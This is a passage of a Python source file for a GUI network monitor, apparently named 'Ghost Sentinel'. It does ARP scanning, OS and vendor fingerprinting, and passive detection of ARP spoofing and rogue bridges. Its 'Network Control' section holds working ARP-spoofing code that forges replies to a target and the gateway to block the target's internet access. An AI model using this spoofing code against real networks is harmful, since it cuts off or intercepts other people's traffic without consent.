            # TTL > 128 → Network device / router (default TTL = 255)
            resp = sr1(IP(dst=ip) / ICMP(), timeout=1, verbose=0)
            if resp:
                ttl = resp.getlayer(IP).ttl
                if self.is_private_mac(mac):
                    # Private MACs are almost exclusively mobile OSes.
                    # Distinguish iOS vs Android by TTL: both start at 64,
                    # but iOS devices frequently block ICMP — if we DO get a
                    # reply at TTL ≤ 64 it is most likely Android.
                    if ttl <= 64:
                        return f"Android / iOS (TTL:{ttl})"
                    elif ttl <= 128:
                        # Unusual for a mobile, but possible (Windows hotspot
                        # sharing, etc.)
                        return f"Mobile / Windows (TTL:{ttl})"
                    else:
                        return f"Network Device (TTL:{ttl})"
                else:
                    if ttl <= 64:
                        return f"Linux / Android (TTL:{ttl})"
                    elif ttl <= 128:
                        return f"Windows (TTL:{ttl})"
                    else:
                        return f"Network Device (TTL:{ttl})"

            # ── No ICMP reply ─────────────────────────────────────────────
            # Private-MAC device that blocks pings → could be iOS (strict
            # firewall) or any hardened mobile.  Mark as Mobile until DHCP
            # fingerprinting gives us something better.
            if self.is_private_mac(mac):
                return "Mobile (iOS likely — awaiting DHCP)"

            return "OS Hidden (Firewall)"
        except Exception:
            return "Detection Failed"

    def get_vendor(self, mac: str) -> str:
        """
        Resolve vendor name from OUI. Uses an in-memory cache to avoid
        repeated API calls for the same MAC during a session.
        """
        if not mac:
            return "Unknown"

        mac_up = mac.upper()

        # Return cached result immediately if available
        if mac_up in _vendor_cache:
            return _vendor_cache[mac_up]

        try:
            first_octet = int(mac_up.split(":")[0], 16)
        except Exception:
            return "Unknown"

        if first_octet & 0b10:
            _vendor_cache[mac_up] = "Private MAC (Mobile)"
            return "Private MAC (Mobile)"

        oui = ":".join(mac_up.split(":")[:3])
        manual = {
            "00:00:F0": "Samsung", "F0:18:98": "Samsung", "3C:5A:B4": "Samsung",
            "FC:C2:DE": "Xiaomi",  "50:8F:4C": "Xiaomi",
            "BC:92:6B": "Huawei",  "F4:8C:50": "Huawei",
        }
        if oui in manual:
            _vendor_cache[mac_up] = manual[oui]
            return manual[oui]

        try:
            r = requests.get(
                f"https://api.maclookup.app/v2/macs/{mac_up}", timeout=2)
            if r.status_code == 200:
                d = r.json()
                if d.get('found') and d.get('company'):
                    _vendor_cache[mac_up] = d['company']
                    return d['company']
        except Exception:
            pass

        _vendor_cache[mac_up] = "Unknown Vendor"
        return "Unknown Vendor"

    def get_hostname(self, ip: str) -> str:
        """Reverse-DNS lookup with a short timeout to avoid blocking the scan loop."""
        try:
            socket.setdefaulttimeout(0.5)
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return "Hidden/Unknown"

    def calculate_uptime(self, start_time: float) -> str:
        """Return elapsed time since start_time as HH:MM:SS."""
        e = int(time.time() - start_time)
        h, r = divmod(e, 3600)
        m, s = divmod(r, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    # ══════════════════════════════════════════════════════════════════════
    # SCANNER THREADS
    # ══════════════════════════════════════════════════════════════════════

    def _resolve_ifaces(self) -> list:
        """Determine which interfaces to use and print a startup summary."""
        ifaces = self._selected_ifaces or [_detect_gateway_interface()]
        print("=" * 60)
        print("[Ghost Sentinel] Starting monitoring session")
        print(f"[Ghost Sentinel] Interface(s): {', '.join(ifaces)}")
        for name in ifaces:
            try:
                ip = get_if_addr(name)
                print(f"  • {name}  →  IP: {ip}")
            except Exception:
                print(f"  • {name}  →  IP: unknown")
        print(f"[Ghost Sentinel] Network : {self.network_entry.get().strip()}")
        print("=" * 60)
        return ifaces

    def stop_scanning(self, *, clear_devices: bool = True):
        """Signal all scan threads to stop and wait for them to exit."""
        print("[Ghost Sentinel] stop_scanning() called")
        self.monitoring = False
        self._stop_event.set()
        self._scan_wake.set()

        TIMEOUT = 6
        for t in self._scan_threads:
            if t.is_alive():
                t.join(timeout=TIMEOUT)
                if t.is_alive():
                    print(f"[Ghost Sentinel] WARNING: thread {t.name!r} "
                          f"did not exit within {TIMEOUT} s — continuing.")
        self._scan_threads.clear()

        # Reset events for the next session
        self._stop_event = threading.Event()
        self._scan_wake.clear()

        if clear_devices:
            self.device_first_seen.clear()
            self.after(0, self.update_table)
            self.after(0, lambda: self.status_label.configure(text="Stopped."))

        self.after(0, lambda: self.refresh_button.configure(
            text="▶  Start Monitoring", state="normal"))
        print("[Ghost Sentinel] All scan threads stopped.")

    def start_scanning(self):
        """Start all background threads for a new monitoring session."""
        if self.monitoring:
            self.stop_scanning(clear_devices=False)

        self._stop_event  = threading.Event()
        self._scan_wake   = threading.Event()
        self.monitoring   = True

        ifaces = self._resolve_ifaces()
        self._active_ifaces = ifaces

        network     = self.network_entry.get().strip()
        iface_label = ", ".join(ifaces)

        self.after(0, lambda: self.status_label.configure(
            text=f"Monitoring  {network}  on  {iface_label}"))
        self.after(0, lambda: self.refresh_button.configure(
            text="🔄  Refresh Scan", state="normal"))

        threads = [
            threading.Thread(
                target=self.continuous_scan,
                args=(network,),
                name="ghost-scan",
                daemon=True,
            ),
            threading.Thread(
                target=self.uptime_updater,
                name="ghost-uptime",
                daemon=True,
            ),
            threading.Thread(
                target=self.start_dhcp_sniffer,
                name="ghost-dhcp",
                daemon=True,
            ),
            threading.Thread(
                target=self.start_hotspot_sniffer,
                name="ghost-bridge",
                daemon=True,
            ),
        ]
        self._scan_threads = threads
        for t in threads:
            t.start()
        print(f"[Ghost Sentinel] {len(threads)} threads started.")

    def refresh_scan(self):
        """Stop the current session and immediately start a fresh one."""
        print("[Ghost Sentinel] refresh_scan() — stopping old session…")
        self.after(0, lambda: self.status_label.configure(text="Restarting scan…"))
        self.after(0, lambda: self.refresh_button.configure(state="disabled"))

        def _restart():
            self.stop_scanning(clear_devices=True)
            self.start_scanning()

        threading.Thread(target=_restart, name="ghost-restart", daemon=True).start()

    def start_monitoring(self):
        """Alias for start_scanning() — kept for backward compatibility."""
        self.start_scanning()

    def continuous_scan(self, network: str):
        """Adaptive ARP scan loop. Backs off during active spoof sessions."""
        while self.monitoring and not self._stop_event.is_set():
            self.scan_network(network)
            interval = 5 if self._active_session_exists() else 3
            self._scan_wake.wait(timeout=interval)
            self._scan_wake.clear()

    def _is_blocked(self, ip: str) -> bool:
        s = self._spoof_sessions.get(ip)
        return s is not None and s['status'] == 'blocking'

    def _os_probe_worker(self, key: str, ip: str, vendor: str,
                         hostname: str, mac: str):
        """
        Run OS detection in a dedicated thread so it never blocks the ARP
        sweep loop. Updates the device record and refreshes the UI when done.
        """
        if key not in self.device_first_seen:
            return
        result = self.detect_os(ip, vendor, hostname, mac)
        if key in self.device_first_seen:
            d = self.device_first_seen[key]
            if d.get('os_confidence', 0) < 70:
                d['os'] = result
            self.after(0, self.update_table)

    def scan_network(self, network: str):
        """
        Perform one ARP sweep of the target network range.

        Kept deliberately fast — no blocking ICMP/DNS/API calls inside the
        loop. OS detection is dispatched to a short-lived background thread
        per new (or stale) device so it never causes Offline false-positives.
        """
        try:
            iface  = self._active_ifaces[0] if getattr(self, '_active_ifaces', []) else None
            kwargs = {'timeout': 0.5, 'verbose': 0}
            if iface:
                kwargs['iface'] = iface
            ans, _ = arping(network, **kwargs)
            current_keys: set = set()

            for _, received in ans:
                ip  = received[ARP].psrc
                mac = received[Ether].src

                if self._is_blocked(ip):
                    key = next(
                        (k for k, v in self.device_first_seen.items()
                         if v['ip'] == ip), None)
                    if key is not None:
                        self.device_first_seen[key]['status'] = 'Blocked'
                        current_keys.add(key)
                    continue

                vendor   = self.get_vendor(mac)
                hostname = self.get_hostname(ip)
                key      = hostname if hostname != "Hidden/Unknown" else ip

                if key not in self.device_first_seen:
                    # Register immediately as Online with placeholder OS
                    self.device_first_seen[key] = {
                        'ip':            ip,
                        'mac':           mac,
                        'vendor':        vendor,
                        'hostname':      hostname,
                        'start_time':    time.time(),
                        'os':            'Detecting…',
                        'os_confidence': 0,
                        'status':        'Online',
                    }
                    threading.Thread(
                        target=self._os_probe_worker,
                        args=(key, ip, vendor, hostname, mac),
                        name=f"ghost-os-{ip}",
                        daemon=True,
                    ).start()

                else:
                    d = self.device_first_seen[key]
                    d.update(status='Online', ip=ip, mac=mac,
                             vendor=vendor, hostname=hostname)

                    _stale = (
                        'Detecting…',
                        'OS Hidden (Firewall)',
                        'Detection Failed',
                        'Unknown (awaiting DHCP)',
                        'Mobile (iOS likely — awaiting DHCP)',
                    )
                    needs_probe = (
                        d.get('os_confidence', 0) < 70
                        and ('TTL' in d.get('os', '') or d.get('os') in _stale)
                    )
                    if needs_probe:
                        threading.Thread(
                            target=self._os_probe_worker,
                            args=(key, ip, vendor, hostname, mac),
                            name=f"ghost-os-{ip}",
                            daemon=True,
                        ).start()

                current_keys.add(key)

            # Mark any device not seen in this sweep as Offline
            for key, d in self.device_first_seen.items():
                if key not in current_keys and not self._is_blocked(d['ip']):
                    d['status'] = 'Offline'

            self.after(0, self.update_table)
            self.after(0, self._save_devices)

        except Exception as e:
            err_msg = f"Scan Error: {type(e).__name__}: {e}"
            self.after(0, lambda: self.status_label.configure(text=err_msg))


    # ── DHCP sniffer ───────────────────────────────────────────────────────

    def dhcp_packet_handler(self, packet):
        """
        Passive DHCP fingerprinting: extract the parameter-request-list option
        and update the device OS field if confidence is high enough.
        """
        try:
            if not (packet.haslayer('DHCP') and packet.haslayer('IP')):
                return

            param_req_list = None
            for opt in packet['DHCP'].options:
                if isinstance(opt, tuple) and opt[0] == 'param_req_list':
                    param_req_list = tuple(opt[1])
                    break
            if not param_req_list:
                return

            detected_os, confidence = match_dhcp_fingerprint(param_req_list)
            if not detected_os or confidence < 70:
                return

            src_ip     = packet['IP'].src
            client_mac = (packet['Ether'].src.lower()
                          if packet.haslayer('Ether') else None)

            for key, data in self.device_first_seen.items():
                mac_match = client_mac and data['mac'].lower() == client_mac
                ip_match  = data['ip'] == src_ip and src_ip != '0.0.0.0'
                if mac_match or ip_match:
                    if confidence > data.get('os_confidence', 0):
                        data['os']            = detected_os
                        data['os_confidence'] = confidence
                        self.after(0, self.update_table)
                    break
        except Exception:
            pass

    def start_dhcp_sniffer(self):
        """Short-burst sniff loop — exits when monitoring=False or _stop_event fires."""
        ifaces     = getattr(self, '_active_ifaces', None) or None
        stop_event = self._stop_event
        while self.monitoring and not stop_event.is_set():
            sniff(
                filter="udp port 67 or udp port 68",
                prn=self.dhcp_packet_handler,
                store=False,
                timeout=2,
                iface=ifaces,
            )

    # ══════════════════════════════════════════════════════════════════════
    # GATEWAY-CENTRIC BRIDGE / ROGUE ROUTER DETECTION ENGINE
    # ══════════════════════════════════════════════════════════════════════

    _OS_TTL_BASELINES = {
        'windows': 128, 'linux': 64, 'android': 64,
        'ios': 64, 'macos': 64, 'router': 255, 'gateway': 255,
    }

    def _baseline_ttl_for_mac(self, mac: str) -> int:
        """
        Return the expected initial TTL for a known device by MAC address.
        Returns 0 if the device is not in the known-device table.
        """
        mac_l = mac.lower()
        for data in self.device_first_seen.values():
            if data.get('mac', '').lower() == mac_l:
                os_str = data.get('os', '').lower()
                for kw, ttl in self._OS_TTL_BASELINES.items():
                    if kw in os_str:
                        return ttl
                break
        return 0

    def _ensure_suspect(self, mac: str, now: float) -> dict:
        """
        Return the bridge-suspect record for mac, creating it if absent.
        Metadata (vendor, hostname) is populated from device_first_seen when available.
        """
        if mac not in self.bridge_suspects:
            meta = next(
                (d for d in self.device_first_seen.values()
                 if d.get('mac', '').lower() == mac.lower()), {})
            self.bridge_suspects[mac] = {
                'suspect_mac':     mac,
                'known_ips':       set(),
                'forwarded_macs':  set(),
                'vendor':          meta.get('vendor', 'Unknown Vendor'),
                'hostname':        meta.get('hostname', 'Hidden/Unknown'),
                'arp_spoof_count': 0,
                'ttl_drops':       [],
                'first_seen':      now,
                'last_seen':       now,
                'confidence':      'Low',
                'reason':          '',
            }
        return self.bridge_suspects[mac]

    def _refresh_suspect_meta(self, rec: dict):
        """Sync vendor / hostname from the live device table into a suspect record."""
        mac_l = rec['suspect_mac'].lower()
        meta = next(
            (d for d in self.device_first_seen.values()
             if d.get('mac', '').lower() == mac_l), None)
        if meta:
            rec['vendor']   = meta.get('vendor',   rec['vendor'])
            rec['hostname'] = meta.get('hostname', rec['hostname'])

    def _score_suspect(self, rec: dict) -> str:
        """Compute a confidence level (Low / Medium / High) for a suspect record."""
        arp_hits = rec.get('arp_spoof_count', 0)
        ttl_hits = len(rec.get('ttl_drops', []))
        clients  = len(rec.get('forwarded_macs', set()))
        if arp_hits >= 3 or clients >= 3:
            return 'High'
        if arp_hits >= 1 or ttl_hits >= 3 or clients >= 2:
            return 'Medium'
        return 'Low'

    def _build_reason(self, rec: dict) -> str:
        """Build a human-readable reason string from a suspect record's evidence."""
        parts = []
        if rec.get('arp_spoof_count', 0):
            parts.append(f"ARP hijack ×{rec['arp_spoof_count']}")
        if rec.get('ttl_drops'):
            parts.append(f"TTL−1 ×{len(rec['ttl_drops'])}")
        if rec.get('forwarded_macs'):
            parts.append(f"routing {len(rec['forwarded_macs'])} client(s)")
        return ", ".join(parts) if parts else "Suspected bridge"

    def _arp_handler(self, packet):
        """
        Process a captured ARP reply.
        - Learn the primary gateway MAC from .1 addresses.
        - Flag any device that claims an IP already owned by a different MAC.
        """
        try:
            if not packet.haslayer(ARP):
                return
            arp = packet[ARP]
            if arp.op != 2:   # only process ARP replies
                return

            sender_ip  = arp.psrc
            sender_mac = arp.hwsrc.lower()
            now = time.time()

            # Gateway learning / spoofing detection
            if sender_ip.endswith('.1') or sender_ip == self._primary_gw_ip:
                if not self._primary_gw_mac:
                    self._primary_gw_mac = sender_mac
                    self._primary_gw_ip  = sender_ip
                    self.after(0, lambda: self.gw_info_label.configure(
                        text=f"{self._primary_gw_ip}  ({self._primary_gw_mac.upper()})"))
                    return
                if sender_mac != self._primary_gw_mac:
                    rec = self._ensure_suspect(sender_mac, now)
                    rec['known_ips'].add(sender_ip)
                    rec['arp_spoof_count'] += 1
                    rec['last_seen'] = now
                    self._refresh_suspect_meta(rec)
                    rec['confidence'] = self._score_suspect(rec)
                    rec['reason']     = self._build_reason(rec)
                    self.after(0, self._update_insights_table)
                return

            # Non-gateway ARP conflict detection
            known_mac_for_ip = next(
                (d.get('mac', '').lower()
                 for d in self.device_first_seen.values()
                 if d.get('ip') == sender_ip), None)

            if known_mac_for_ip and known_mac_for_ip != sender_mac:
                rec = self._ensure_suspect(sender_mac, now)
                rec['known_ips'].add(sender_ip)
                rec['arp_spoof_count'] += 1
                rec['last_seen'] = now
                self._refresh_suspect_meta(rec)
                rec['confidence'] = self._score_suspect(rec)
                rec['reason']     = self._build_reason(rec)
                self.after(0, self._update_insights_table)

        except Exception:
            pass

    def _ip_ttl_handler(self, packet):
        """
        Detect bridge / MITM devices by observing TTL−1 forwarding.
        If a known device's packet arrives with a TTL exactly one less than
        its OS baseline, it has been forwarded through an intermediate host.
        """
        try:
            if not (packet.haslayer(IP) and packet.haslayer(Ether)):
                return

            src_mac = packet[Ether].src.lower()
            dst_mac = packet[Ether].dst.lower()
            src_ip  = packet[IP].src
            ttl_obs = packet[IP].ttl

            # Ignore multicast, broadcast, and loopback
            if (src_ip.startswith('224.') or src_ip.startswith('239.')
                    or src_ip.startswith('255.') or src_ip == '127.0.0.1'
                    or src_mac == 'ff:ff:ff:ff:ff:ff'):
                return

            # Only analyse traffic from devices we have already seen
            known_macs = {d.get('mac', '').lower()
                          for d in self.device_first_seen.values()}
            if src_mac not in known_macs:
                return

            # Skip the primary gateway — it legitimately decrements TTL
            if src_mac == self._primary_gw_mac:
                return

            ttl_exp = self._baseline_ttl_for_mac(src_mac)
            if ttl_exp == 0:
                # No OS baseline known — use common decremented values as a hint
                if ttl_obs not in (63, 127, 254):
                    return
                ttl_exp = ttl_obs + 1

            drop = ttl_exp - ttl_obs
            if drop != 1:
                return

            now = time.time()
            rec = self._ensure_suspect(src_mac, now)
            rec['known_ips'].add(src_ip)
            rec['last_seen'] = now

            rec['ttl_drops'].append((ttl_obs, ttl_exp))
            if len(rec['ttl_drops']) > 50:   # keep rolling window bounded
                rec['ttl_drops'] = rec['ttl_drops'][-50:]

            if dst_mac and dst_mac != self._primary_gw_mac:
                rec['forwarded_macs'].add(dst_mac)

            self._refresh_suspect_meta(rec)
            rec['confidence'] = self._score_suspect(rec)
            rec['reason']     = self._build_reason(rec)
            self.after(0, self._update_insights_table)

        except Exception:
            pass

    def start_hotspot_sniffer(self):
        """
        Passive bridge-detection loop.
        Alternates between ARP sniffing and IP/TTL sniffing in 2-second bursts
        so that the stop-event is checked frequently enough to exit cleanly.
        """
        ifaces     = getattr(self, '_active_ifaces', None) or None
        stop_event = self._stop_event
        self.after(0, lambda: self.insights_status.configure(
            text="🟢  Bridge detection active — monitoring ARP + TTL passively…"))
        while self.monitoring and not stop_event.is_set():
            sniff(filter="arp", prn=self._arp_handler,
                  store=False, timeout=2, iface=ifaces)
            if not self.monitoring or stop_event.is_set():
                break
            sniff(
                filter="ip and not (udp port 67 or udp port 68) "
                       "and not (dst net 224.0.0.0/4)",
                prn=self._ip_ttl_handler,
                store=False, timeout=2, iface=ifaces,
            )
        self.after(0, lambda: self.insights_status.configure(
            text="Monitoring stopped."))

    def _clear_bridge_suspects(self):
        """Clear all bridge-suspect records and reset the learned gateway info."""
        self.bridge_suspects.clear()
        self._primary_gw_mac = ""
        self._primary_gw_ip  = ""
        self.gw_info_label.configure(text="Not yet detected")
        self._update_insights_table()
        self._save_devices()

    def _update_insights_table(self):
        """Rebuild the Advanced Insights treeview from bridge_suspects."""
        for item in self.insights_tree.get_children():
            self.insights_tree.delete(item)

        for mac, rec in sorted(
                self.bridge_suspects.items(),
                key=lambda kv: kv[1].get('last_seen', 0),
                reverse=True):

            last_seen = time.strftime(
                "%Y-%m-%d %H:%M:%S",
                time.localtime(rec.get('last_seen', 0)))

            known_ips_str = ", ".join(sorted(rec.get('known_ips', set())))
            clients_count = len(rec.get('forwarded_macs', set()))

            values = (
                rec.get('suspect_mac', mac).upper(),
                known_ips_str,
                rec.get('hostname', 'Hidden/Unknown'),
                rec.get('vendor',   'Unknown Vendor'),
                str(clients_count),
                str(rec.get('arp_spoof_count', 0)),
                str(len(rec.get('ttl_drops', []))),
                rec.get('confidence', 'Low'),
                rec.get('reason', ''),
                last_seen,
            )
            conf_tag = rec.get('confidence', 'Low').lower()
            iid = self.insights_tree.insert("", "end", values=values)
            self.insights_tree.item(iid, tags=(conf_tag,))

        count = len(self.bridge_suspects)
        label = (f"⚠  {count} suspected bridge / rogue gateway device(s) flagged."
                 if count else "✅  No bridge or rogue gateway activity detected.")
        self.insights_status.configure(text=label)

    # ══════════════════════════════════════════════════════════════════════
    # NETWORK CONTROL — ARP SPOOFING
    # ══════════════════════════════════════════════════════════════════════

    def _log(self, message: str):
        """Append a timestamped line to the Network Control activity log."""
        ts = time.strftime("%H:%M:%S")
        self.spoof_log.configure(state="normal")
        self.spoof_log.insert("end", f"[{ts}]  {message}\n")
        self.spoof_log.see("end")
        self.spoof_log.configure(state="disabled")

    def _get_mac(self, ip: str):
        """Resolve an IP address to its MAC via ARP. Returns None on failure."""
        ans, _ = arping(ip, timeout=2, verbose=0)
        for _, r in ans:
            return r[Ether].src
        return None

    def _active_session_exists(self) -> bool:
        """Return True if any spoof session is currently blocking or restoring."""
        for s in self._spoof_sessions.values():
            if s['status'] in ('blocking', 'restoring'):
                return True
            t = s.get('thread')
            if t and t.is_alive():
                return True
        return False

    def _sync_block_buttons(self):
        """Enable / disable block buttons to reflect the current session state."""
        active = self._active_session_exists()
        self.block_button.configure(state="disabled" if active else "normal")
        self.unblock_button.configure(state="normal")
        if active:
            self.status_label.configure(
                text="⚠  Spoof active — blocked device data is frozen.")

    def arp_spoof(self, target_ip: str, gateway_ip: str,
                  stop_event: threading.Event):
        """
        Continuously send forged ARP replies to both the target and the gateway,
        intercepting traffic in both directions until stop_event is set.
        Automatically calls restore_network() before exiting.
        """
        session = self._spoof_sessions[target_ip]

        target_mac  = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)

        if not target_mac:
            self.after(0, lambda: self._log(
                f"ERROR: Cannot resolve MAC for {target_ip}. Aborting."))
            session['status'] = 'idle'
            self.after(0, self._sync_block_buttons)
            return

        if not gateway_mac:
            self.after(0, lambda: self._log(
                f"ERROR: Cannot resolve MAC for gateway {gateway_ip}. Aborting."))
            session['status'] = 'idle'
            self.after(0, self._sync_block_buttons)
            return

        session['target_mac']  = target_mac
        session['gateway_mac'] = gateway_mac

        self.after(0, lambda: self._log(f"Target  → {target_ip}  ({target_mac})"))
        self.after(0, lambda: self._log(f"Gateway → {gateway_ip}  ({gateway_mac})"))
        self.after(0, lambda: self._log(
            "Spoofing active — target internet access is now blocked."))

        # Craft forged ARP replies for both directions
        pkt_to_target = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
            op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        while not stop_event.is_set():
            sendp(pkt_to_target,  verbose=0)
            sendp(pkt_to_gateway, verbose=0)
            stop_event.wait(timeout=1.5)

        session['status'] = 'restoring'
        self.after(0, lambda: self._log(
            "Stop signal received — restoring ARP tables…"))
        self.restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
        session['status'] = 'idle'
        self.after(0, lambda: self._log(
            f"Session for {target_ip} is now idle. Network restored."))
        self.after(0, self._sync_block_buttons)
        self.after(0, self._save_devices)

    def restore_network(self, target_ip: str, target_mac: str,
                         gateway_ip: str, gateway_mac: str):
        """
        Send corrective ARP replies to both the target and the gateway,
        restoring their real MAC ↔ IP mappings after a spoof session ends.
        Sends 5 gratuitous packets with 400 ms spacing for reliability.
        """
        pkt_fix_target = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,  hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac,
        )
        pkt_fix_gateway = Ether(dst=gateway_mac) / ARP(
            op=2,
            pdst=gateway_ip,  hwdst=gateway_mac,
            psrc=target_ip,   hwsrc=target_mac,
        )
        for _ in range(5):
            sendp(pkt_fix_target,  verbose=0)
            sendp(pkt_fix_gateway, verbose=0)
            time.sleep(0.4)

        self.after(0, lambda: self._log(
            "Network restored. Target has internet access again."))

    def start_block(self):
        """Validate inputs and launch an ARP spoof session against the target IP."""
        target_ip  = self.target_ip_entry.get().strip()
        gateway_ip = self.gateway_ip_entry.get().strip()

        if not target_ip or not gateway_ip:
            self._log("ERROR: Enter both Target IP and Gateway IP.")
            return

        if self._active_session_exists():
            self._log("Already blocking — click Unblock first.")
            return

        stop_event = threading.Event()
        session = {
            'stop_event':  stop_event,
            'thread':      None,
            'status':      'blocking',
            'target_mac':  None,
            'gateway_ip':  gateway_ip,
            'gateway_mac': None,
        }
        self._spoof_sessions[target_ip] = session

        t = threading.Thread(
            target=self.arp_spoof,
            args=(target_ip, gateway_ip, stop_event),
            daemon=True,
        )
        session['thread'] = t
        t.start()

        self._log(f"Starting block on {target_ip} via gateway {gateway_ip}…")
        self._sync_block_buttons()

    def stop_block(self):
        """
        Signal the active spoof session(s) to stop.
        If a specific IP is in the target field, only that session is stopped;
        otherwise all active sessions are stopped.
        """
        target_ip = self.target_ip_entry.get().strip()

        if target_ip and target_ip in self._spoof_sessions:
            targets_to_stop = [target_ip]
        else:
            targets_to_stop = [
                ip for ip, s in self._spoof_sessions.items()
                if s['status'] in ('blocking', 'restoring')
            ]

        if not targets_to_stop:
            self._log("No active block session found.")
            return

        for ip in targets_to_stop:
            session = self._spoof_sessions[ip]
            if not session['stop_event'].is_set():
                self._log(f"Unblock requested for {ip} — signalling thread…")
                session['stop_event'].set()

            # Optimistically mark device as Online in the UI
            for data in self.device_first_seen.values():
                if data['ip'] == ip and data['status'] == 'Blocked':
                    data['status'] = 'Online'
                    break

        self.after(0, self.update_table)
        self.after(0, self._sync_block_buttons)

        def _cleanup(snapshot):
            """Wait for spoof threads to exit; force-restore if they hang."""
            for ip, session in snapshot:
                thread = session.get('thread')
                if thread and thread.is_alive():
                    thread.join(timeout=4)

                if thread and thread.is_alive():
                    t_mac = session.get('target_mac')
                    g_ip  = session.get('gateway_ip')
                    g_mac = session.get('gateway_mac')
                    if t_mac and g_ip and g_mac:
                        self.after(0, lambda: self._log(
                            f"WARNING: thread for {ip} stuck — restoring directly."))
                        self.restore_network(ip, t_mac, g_ip, g_mac)

                session['status'] = 'idle'

            self.after(0, self._sync_block_buttons)
            self.after(0, self._save_devices)

        snapshot = [
            (ip, self._spoof_sessions[ip])
            for ip in targets_to_stop
            if ip in self._spoof_sessions
        ]
        threading.Thread(target=_cleanup, args=(snapshot,), daemon=True).start()

    def _on_close(self):
        """
        Window close handler.
        Signals all threads to stop, synchronously restores any active ARP
        spoof sessions so no device is left blocked, saves state, then exits.
        """
        print("[Ghost Sentinel] Shutdown initiated…")

        # 1. Stop all scan threads
        self.monitoring = False
        self._stop_event.set()
        self._scan_wake.set()

        # 2. Restore any active spoof sessions immediately (no thread.join needed
        #    because we call restore_network directly from this thread)
        for ip, session in self._spoof_sessions.items():
            if session['status'] in ('blocking', 'restoring'):
                print(f"[Ghost Sentinel] Restoring ARP for {ip}…")
                session['stop_event'].set()
                t_mac = session.get('target_mac')
                g_ip  = session.get('gateway_ip')
                g_mac = session.get('gateway_mac')
                if t_mac and g_ip and g_mac:
                    try:
                        self.restore_network(ip, t_mac, g_ip, g_mac)
                    except Exception:
                        pass

        # 3. Persist device and suspect data
        self._save_devices()
        print("[Ghost Sentinel] Shutdown complete.")
        self.destroy()
        sys.exit(0)

    def update_table(self):
        """Rebuild the Scanner treeview from device_first_seen."""
        for item in self.tree.get_children():
            self.tree.delete(item)

        for key, data in self.device_first_seen.items():
            uptime = self.calculate_uptime(data['start_time'])
            values = (
                data['ip'], data['mac'], data['hostname'],
                data['vendor'], data['os'], data['status'], uptime,
            )
            iid = self.tree.insert("", "end", values=values)
            data['iid'] = iid
            tag = {'Online': 'online', 'Blocked': 'blocked'}.get(
                data['status'], 'offline')
            self.tree.item(iid, tags=(tag,))

        self.status_label.configure(
            text=f"Monitoring active — {len(self.device_first_seen)} devices tracked.")

    def uptime_updater(self):
        """Background thread: tick uptime column every second."""
        stop_event = self._stop_event
        while self.monitoring and not stop_event.is_set():
            self.after(0, self.update_uptimes)
            stop_event.wait(timeout=1)

    def update_uptimes(self):
        """Update only the uptime column for all visible rows (avoids full table rebuild)."""
        for data in self.device_first_seen.values():
            if 'iid' in data:
                vals    = list(self.tree.item(data['iid'], 'values'))
                vals[6] = self.calculate_uptime(data['start_time'])
                self.tree.item(data['iid'], values=vals)


# ══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if not _is_admin():
        want_restart = _show_privilege_dialog()
        if want_restart:
            _restart_as_admin()
        else:
            sys.exit(0)

    app = NetworkScannerApp()
    try:
        app.mainloop()
    finally:
        app._save_devices()
